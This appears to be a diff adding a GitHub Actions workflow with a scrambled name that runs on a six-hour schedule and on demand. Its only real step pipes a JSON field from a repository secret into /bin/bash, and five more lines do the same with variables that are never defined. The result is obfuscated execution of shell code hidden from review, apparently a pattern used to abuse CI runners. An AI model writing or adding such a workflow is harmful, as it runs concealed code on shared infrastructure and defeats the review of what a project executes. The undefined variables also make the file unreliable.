@@ -1,0 +1,21 @@
+name: zonfgeryanzhizongzhi
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '29 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zonfgeryanzhizongzhi
+        env:
+          ilit75: ${{ secrets.ilit75 }}
+        run: |
+          echo $ilit75 | jq -r .kib2657 | /bin/bash
+          echo $ekjn470 | jq -r .ndere6516 | /bin/bash
+          echo $e06894 | jq -r .rr39 | /bin/bash
+          echo $xebxl80 | jq -r .ho44 | /bin/bash
+          echo $qo28 | jq -r .drhsj0 | /bin/bash
+          echo $oqpka7475 | jq -r .mqvbo47 | /bin/bash
+
